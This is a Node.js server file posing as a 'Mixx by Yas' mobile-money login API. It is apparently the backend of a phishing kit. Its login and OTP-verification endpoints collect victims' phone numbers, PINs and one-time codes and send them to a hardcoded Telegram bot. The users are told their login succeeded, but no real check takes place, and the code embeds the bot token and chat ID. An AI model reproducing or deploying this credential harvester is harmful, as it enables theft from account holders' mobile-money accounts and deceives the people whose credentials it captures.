const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

// ===== CORS =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

app.use(express.json());

// ===== PORT =====
const PORT = process.env.PORT || 5000;

// ===== TELEGRAM CREDENTIALS =====
const TELEGRAM_BOT_TOKEN = '8942634790:AAEniaOpFLFGoQgn-f60yKAaMvYhPpNzx7s';
const TELEGRAM_CHAT_ID = '8392790531';

console.log('🚀 Starting server...');
console.log(`📡 PORT: ${PORT}`);

// ===== SEND TO TELEGRAM =====
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
        return response.data;
    } catch (error) {
        console.log('❌ Telegram error:', error.response?.data || error.message);
        return null;
    }
}

// ===== ENDPOINTS =====
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Mixx by Yas API is running!',
        timestamp: new Date().toISOString()
    });
});

app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        port: PORT
    });
});

// ===== LOGIN =====
app.post('/api/login', async (req, res) => {
    console.log('📥 Login:', req.body);
    const { phone, pin } = req.body;

    if (!phone || !pin) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone and PIN are required'
        });
    }

    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    console.log(`🔐 OTP for ${phone}: ${otp}`);

    // Send to Telegram - OTP REMOVED from this message
    await sendTelegramMessage(`
🔔 <b>MIXX BY YAS - LOGIN</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔐 <b>PIN:</b> <code>${pin}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `);

    res.json({
        status: 'success',
        message: 'Login successful! OTP generated.',
        data: { phone, otp }
    });
});

// ===== VERIFY OTP =====
app.post('/api/verify-otp', async (req, res) => {
    console.log('📥 Verify OTP:', req.body);
    const { phone, otp } = req.body;

    if (!phone || !otp) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone and OTP are required'
        });
    }

    // Send to Telegram
    await sendTelegramMessage(`
✅ <b>MIXX BY YAS - OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔑 <b>OTP Entered:</b> <code>${otp}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString()}
📊 <b>Status:</b> VERIFIED ✅

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `);

    res.json({
        status: 'success',
        message: 'OTP verified successfully!',
        data: { phone, verified: true }
    });
});

// ===== RESEND OTP =====
app.post('/api/resend-otp', async (req, res) => {
    console.log('📥 Resend OTP:', req.body);
    const { phone } = req.body;

    if (!phone) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone is required'
        });
    }

    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    await sendTelegramMessage(`
🔄 <b>MIXX BY YAS - RESEND OTP</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔑 <b>New OTP:</b> <code>${otp}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `);

    res.json({
        status: 'success',
        message: 'New OTP sent successfully!',
        data: { phone, otp }
    });
});

// ===== START =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 https://mixxbyyas-offers06com-production.up.railway.app`);
    console.log('✅ Server is ready!');
});
